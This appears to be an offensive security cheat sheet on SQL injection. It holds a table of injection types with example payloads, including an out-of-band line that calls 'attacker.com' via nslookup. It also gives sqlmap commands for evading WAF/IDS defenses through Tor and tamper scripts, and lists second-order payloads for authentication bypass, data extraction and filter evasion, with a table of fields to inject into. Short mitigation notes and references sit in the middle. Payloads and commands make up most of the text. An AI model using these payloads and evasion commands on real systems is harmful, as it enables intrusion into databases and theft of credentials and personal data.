


### SQL Injection and Its Types


| **Type**                       | **Sub-Type**                  | **Description**                                                                                      | **Example Commands**                                  |
|-------------------------------|-------------------------------|------------------------------------------------------------------------------------------------------|-----------------------------------------------------|
| **In-band SQL Injection**      |                               | Uses the same communication channel for both launching the attack and retrieving results              |                                                     |
|                                | a) **Union-based SQLi**       | Utilizes the SQL UNION operator to combine the results of multiple SELECT queries into a single result set | `1 UNION SELECT username, password FROM users, ' UNION SELECT null, null--, ' UNION SELECT null, null, null--, ' UNION SELECT null, null, null, null--` |
|                                | b) **Error-based SQLi**       | Injects SQL code that triggers database errors, potentially revealing information about the database schema or contents | `AND 1=1--, SELECT 1/0--, AND 1=0--, AND 1=1#, OR 1=1, OR x=x` |
| **Blind SQL Injection**        |                               | The attacker does not see the result of the query directly but infers information from the application's responses |                                                     |
|                                | a) **Boolean-based Blind SQLi** | Sends SQL queries that result in true or false responses to infer data based on the application's behavior | `' OR '1'='1, ' OR 1=1--, " OR "" = ", " OR 1 = 1--, ' OR '' = ', ' OR 1=1 AND 'a'='a` |
|                                | b) **Time-based Blind SQLi**  | Introduces delays in SQL queries to infer data based on the application's response time              | `SLEEP(5)--, " OR SLEEP(5)--, ' OR SLEEP(5)--, WAITFOR DELAY '00:00:10'--` |
| **Out-of-band SQL Injection**  |                               | Uses alternative communication channels (such as DNS or HTTP) to exfiltrate data                      | `http://example.com/somepage.php?id=1; nslookup attacker.com` |
| **Second-order SQL Injection** |                               | The malicious payload is stored within the application's database and executed later when certain conditions are met | `INSERT INTO users (username, password) VALUES ('test', 'test'); -- The stored payload executes later when the application processes the data` |



##  Impact of SQL Injection

The impact of a successful SQL Injection attack can be severe, affecting the integrity, confidentiality, and availability of data. Some of the most critical consequences include:

- Unauthorized access to sensitive information such as usernames, passwords, and credit card details.
- Data theft and unauthorized modification of database records.
- Loss of data integrity, leading to corrupted data.
- System downtime, affecting service availability.
- Financial losses and damage to organizational reputation.

##  Mitigation Measures

To prevent SQL Injection attacks, it is essential to implement strong security practices, including:

- **Input validation and sanitization:** Ensure that all user inputs are properly validated and sanitized to prevent malicious characters.
- **Use of prepared statements:** Prepared statements with parameterized queries prevent SQLi by separating data from code.
- **Database privilege management:** Restrict database access rights and ensure least privilege is applied to reduce the impact of a compromise.
- **Regular security audits and penetration testing:** Regularly scan and test applications for SQL injection vulnerabilities.
- **Use of Web Application Firewalls (WAFs):** A WAF can help detect and block malicious SQL injection attempts.



## References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection)
- [TryHackMe SQL Injection Room](https://tryhackme.com/room/sqlinjectionlm)
- [Heartland Data Breach Details](https://www.computerworld.com/article/2525536/heartland-data-breach-what-went-wrong.html)
- [TalkTalk Breach (2015)](https://www.bbc.com/news/uk-34611857)

---


# Simplified SQLMap Command Guide

---

## Basic Command

```bash
sqlmap -r login.txt --batch --dbs
```

---

## ‍Use Random User-Agent

```bash
sqlmap -r login.txt --batch --dbs --random-agent
```

---

## Use a Proxy

### HTTP Proxy
```bash
sqlmap -r login.txt --batch --dbs --proxy="http://127.0.0.1:8080"
```

### SOCKS Proxy (e.g., Tor)
```bash
sqlmap -r login.txt --batch --dbs --proxy="socks5://127.0.0.1:9050"
```

---

## Tamper Scripts for WAF Bypass

### Single Tamper
```bash
sqlmap -r login.txt --batch --dbs --tamper=space2comment
```

### Multiple Tampers
```bash
sqlmap -r login.txt --batch --dbs --tamper=space2comment,between,charunicodeencode
```

---

## Combined Evasion Examples

### Tamper + Random-Agent + Proxy
```bash
sqlmap -r login.txt --batch --dbs --random-agent --proxy="http://127.0.0.1:8080" --tamper=space2comment,between,charunicodeencode
```

### Deep Obfuscation (Tor + Multiple Tampers)
```bash
sqlmap -r login.txt --batch --dbs --random-agent --proxy="socks5://127.0.0.1:9050" --tamper=charunicodeencode,space2comment,between,unmagicquotes,randomcase
```

## **Bypass most WAF/IDS setups**, **evade filters**, and extract data under strict defenses 


### Complex SQLMap WAF Bypass Command

```bash
sqlmap -r login.txt \
--batch \
--flush-session \
--random-agent \
--threads=10 \
--level=5 \
--risk=3 \
--technique=BEUSTQ \
--dbms=mysql \
--time-sec=10 \
--delay=1 \
--timeout=30 \
--retries=3 \
--proxy="socks5://127.0.0.1:9050" \
--tamper=space2comment,between,charunicodeencode,randomcase,apostrophemask,unmagicquotes,space2plus,modsecurityversioned,modsecurityzeroversioned
```

---

### Explanation of Each Flag

| Option | Description |
|--------|-------------|
| `-r login.txt` | HTTP request file (capture from Burp) |
| `--batch` | Non-interactive mode |
| `--flush-session` | Ignore cached results |
| `--random-agent` | Spoof User-Agent |
| `--threads=10` | Parallel requests |
| `--level=5 --risk=3` | Deep and risky tests |
| `--technique=BEUSTQ` | Use all SQLi techniques |
| `--dbms=mysql` | Assume MySQL to speed up |
| `--time-sec=10` | Increase time-based payload timeout |
| `--delay=1` | Delay between requests |
| `--timeout=30` | Max wait per response |
| `--retries=3` | Retry on timeout |
| `--proxy="socks5://127.0.0.1:9050"` | Tor anonymization proxy |
| `--tamper=...` | Combo of tamper scripts for WAF evasion |

---


## Useful Flags

| Flag | Description |
|------|-------------|
| `--threads=10` | Enable multithreading |
| `--level=5 --risk=3` | Deep and risky testing |
| `--delay=1 --timeout=30` | Timing control |
| `--technique=BEUSTQ` | Use specific SQLi types |
| `--dbms=mysql` | Assume backend DBMS |
| `--flush-session` | Clear previous results |
| `--batch` | Non-interactive mode |

---

## Tips

- Make sure `login.txt` is properly formatted (HTTP request)
- Use `--flush-session` to avoid cached data
- Try simple injections manually before automation
- Combine tamper scripts cautiously






---



# Second Order SQL Injection (SO-SQLi) Guide

## What is Second Order SQL Injection?

**Second Order SQL Injection (SO-SQLi)** occurs when a malicious SQL payload is submitted and stored (e.g., in a database), and is **executed later** when the application reuses that data in an unsafe SQL query.

Unlike first-order SQLi, the injection doesn’t happen right away, it’s **triggered in a separate step**, often in a different part of the application.

---

## How It Works

1. User submits input that is stored (e.g., during registration or profile update).
2. That input is saved **without validation**.
3. Later, the application retrieves and uses the stored data in a SQL query.
4. If this query is built unsafely, the injection is triggered.

---

## Example Scenario

### Step 1: Malicious User Registers

```text
Username: attacker' --
Email: attacker@example.com
```

Stored in DB as:

```sql
INSERT INTO users (username, email) VALUES ('attacker\' --', 'attacker@example.com');
```

No error yet, payload is saved.

---

### Step 2: Admin Dashboard Later Uses Username

```python
# Backend code
query = "SELECT * FROM logs WHERE username = '" + user_from_db + "'"
```

If `user_from_db = attacker' --`, this becomes:

```sql
SELECT * FROM logs WHERE username = 'attacker' --'
```

Query is broken → Injection succeeds.

---

## Where and How to Test Payloads 

| Application Area     | Field to Inject       | Why It's Vulnerable                                    | ⏱When Injection Triggers                |
|------------------------|--------------------------|-----------------------------------------------------------|-------------------------------------------|
| User Registration      | `username`, `email`      | Values stored, reused in logs or admin views              | When admin views logs or user profile     |
| Profile Update         | `display name`, `bio`    | Reused in dashboards or internal reporting tools          | When data is retrieved by another user    |
| Feedback/Contact Forms | `subject`, `message`     | Stored in DB, emailed or inserted into analytics queries  | When viewed or processed by admin         |
| Support Ticket System  | `ticket title`, `details`| May be reused in SQL joins, search features               | When admin searches or filters tickets    |
| Comment Systems        | `username`, `comment`    | Appears in other queries like moderation tools            | When moderator queries by username        |

---

## Tips for Testing SO-SQLi

- Inject payloads like `' OR 1=1 --` into fields that are **stored**, not just reflected.
- Track where that input **reappears later** in the app (logs, admin panel, reports).
- Test different **delays** between storing and triggering (could be minutes or days).
- Use tools like **Burp Suite** to capture and replay original injection attempts.
- Always check **query construction** when reviewing source code (if available).

---


#### Classic Authentication Bypass

```sql
' OR '1'='1
' OR 1=1 --
'-- 
'#
admin'-- 
' OR 1=1 LIMIT 1 --
```

---

#### Error-Based Payloads (to detect execution)

```sql
' AND 1=CONVERT(int, (SELECT @@version))--
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(58),@@version,CHAR(58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

---

#### Time-Based Blind SQLi (for delayed triggers)

```sql
' OR SLEEP(5) --
' AND SLEEP(5) --
' WAITFOR DELAY '00:00:05' --
```

---

#### Union-Based (if data is displayed somewhere)

```sql
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1,2,3 --
' UNION SELECT username, password FROM users --
```

---

#### Obfuscated & Bypassing Filters

```sql
%27%20OR%201%3D1--
%27%20UNION%20SELECT%20NULL,NULL--
admin%27%23
admin')-- 
```

---

#### Null Byte & Comment Tricks

```sql
admin%00
admin'/**/OR/**/'1'='1
admin'/**/-- 
```

---

### Bonus: Tamper-Friendly SO-SQLi Payloads

If the app uses WAFs or input filters:

```sql
'/*!12345UNION*/ SELECT NULL,NULL --
'/**/OR/**/1=1/**/--
' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 80 --
```

---

### Where to Try These Payloads

| Input Type            | Good For Testing SO-SQLi? | Example Use Case                      |
|-----------------------|----------------------------|----------------------------------------|
| `Username`            | Yes                     | Reused in admin or logging queries     |
| `Email`               | Yes                     | Used in backend reports or exports     |
| `Bio/Profile Info`    | Yes                     | Shown in user listings or analytics    |
| `Ticket Subject`      | Yes                     | Often filtered, searched, and joined   |
| `Comments/Posts`      | Yes                     | Parsed in dashboards or moderation     |

---


## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

